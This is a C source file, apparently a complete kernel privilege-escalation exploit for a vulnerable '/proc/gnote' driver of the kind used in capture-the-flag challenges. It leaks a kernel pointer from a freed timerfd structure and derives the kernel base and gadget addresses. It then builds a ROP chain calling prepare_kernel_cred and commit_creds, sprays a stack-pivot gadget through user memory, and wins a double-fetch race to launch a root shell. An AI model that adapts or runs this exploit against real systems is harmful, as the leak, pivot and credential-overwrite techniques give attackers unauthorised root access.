#include <stdio.h>
#include <fcntl.h>
#include <assert.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>

#define DEVICE_NAME "/proc/gnote"

int fd;

struct trape_frame{
	char* rip;
	uint64_t cs;
	uint64_t rflags;
	char* rsp;
	uint64_t ss;
} tf;

void thread_func(void *arg){
	unsigned int* p = arg;
	for(;;){
		*(p) = 0x0;
		*(p) = 0x8000200;
	}
}

void save_state(){
	asm volatile("mov tf+8, cs;"
			"pushf; pop tf+0x10;"
			"mov tf+0x18, rsp;"
			"mov tf+0x20, ss;"			
			);
}

void shell(void){
	printf("root ->");
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

int main(void){
	save_state();
	fd = open(DEVICE_NAME, O_RDWR);
	assert(fd >=3);

	pthread_t tid;
	
	// Need to allocate struct timerfd_ctx
	// It will allocate 0x100 from the general purpose
	// cache using kmem_cache_alloc_trace()
	// When setting timeout, a text kernel pointer
	// is going to show up in one of the elements
	// and that's our leak.
	int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
	assert(timefd > 0);

	// Now setting up the timeout.
	struct itimerspec itimerspec;

	itimerspec.it_interval.tv_sec = 0;
	itimerspec.it_interval.tv_nsec = 0;
	itimerspec.it_value.tv_sec = 100;
	itimerspec.it_value.tv_nsec = 0;

	timerfd_settime(timefd, 0, &itimerspec, 0);
	
	// Free the chunk.
	close(timefd);
	
	// rcu
	sleep(1);
	
	// Malloc our chunk.
	// And read unitialized data from it.
	// Chunk 0.
	unsigned int buf[2];
	buf[0] = 0x1;
	buf[1] = 0x100;
	
	write(fd, buf, sizeof(buf));

	// Select chunk 0.
	buf[0] = 0x5;
	buf[1] = 0x0;

	write(fd, buf, sizeof(buf));


	unsigned long leaks[0x20];
	read(fd, leaks, 0x100);

	for(int i=0; i<0x20; i++){
		printf("QWORD %d\t%p\n", i, leaks[i]);
	}
	
	unsigned long kern_base = leaks[5] - 0x15a2f0;
	unsigned long commit_creds = kern_base + 0x69df0;
	unsigned long prepare_kernel_cred = kern_base + 0x69fe0;
	
	//0xffffffff8125b83b : xchg eax, esp ; xor eax, eax ; ret
	unsigned long pivot = kern_base + 0x25b83b;
	unsigned long pop_rdi = kern_base + 0x1c20d;
	unsigned long mov_rdi_rax = kern_base + 0x21ca6a;
	unsigned long return_to_usermode = kern_base + 0x600a6a;

	
	// The fake stack.
	char* chunk = mmap((char *)(pivot & 0xfffff000),
			0x40000,
			PROT_READ|PROT_WRITE,
			MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
			-1,
			0);
	chunk += 0x83b;
	unsigned long* stack = (unsigned long*)chunk;
	*stack++ = pop_rdi;
	*stack++ = 0;
	*stack++ = prepare_kernel_cred;
	*stack++ = mov_rdi_rax;
	*stack++ = 0;
	*stack++ = commit_creds;
	*stack++ = return_to_usermode;
	*stack++ = 0;
	*stack++ = 0;
	*stack++ = (unsigned long)&shell;
	*stack++ = tf.cs;
	*stack++ = tf.rflags;
	*stack++ = tf.rsp;
	*stack++ = tf.ss;

	printf("The chunk I got @ %p\n", chunk);
	
	// The spray chunk.
	// We're counting on the kernel pointer
	// to overflow and become a userland pointer
	// small pointer.
	char* spray = mmap(	0x1000,
				0x1000000,
				PROT_READ|PROT_WRITE,
				MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
				-1,
				0
			);

	unsigned long* s = (unsigned long*)spray;

	for(int i=0; i<(0x1000000>>3); i++)
		s[i] = pivot;
	printf("The spray chunk @ %p\n", spray);

	// The trigger!
	// Race to change rbx again to a bigger value.
	pthread_create(&tid, NULL, thread_func, &buf[0]);
	
	// Trigger the tainted rbx by
	// rbx is controlled.
	// call [PAGE_TABLE + rbx*8]
	for(;;)
		write(fd, buf, sizeof(buf));
	
	return 0;
}
